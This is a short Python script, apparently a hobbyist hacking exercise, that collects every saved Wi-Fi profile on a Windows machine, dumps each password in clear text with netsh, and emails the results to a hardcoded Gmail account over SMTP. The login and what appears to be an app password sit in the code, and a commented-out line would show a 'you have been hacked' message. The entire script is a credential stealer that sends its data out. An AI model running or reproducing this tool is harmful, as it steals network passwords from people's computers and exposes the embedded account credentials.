import smtplib
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    subject = "Alert, alert!"
    server.login(email, password)
    server.sendmail(email, email, message.encode('utf-8'))
    server.quit()


# command = 'msg * YOU HAVE BEEN HACKED BY CYBSEC'
command = 'netsh wlan show profile'

networks = subprocess.check_output(command, shell=True).decode('cp866')
# print(networks)

# network_names = re.search(r"(?:Profile\s*:\s)(.*)", networks)
network_names_list = re.findall(r"(?:Все профили пользователей\s*:\s)(.*)", networks)

# if network_names_list is not None:
#     print(network_names_list)
# else:
#     print("no wi-fi profiles found")


result = ""
for network_name in network_names_list:
    # print(network_name)
    command = f'netsh wlan show profile {network_name} key=clear'
    current_result = subprocess.check_output(command, shell=True).decode('cp866')
    result += current_result

# print(result)
send_mail('zilolayakubova.zy@gmail.com', 'uaxdgdqzparjqfag', result)
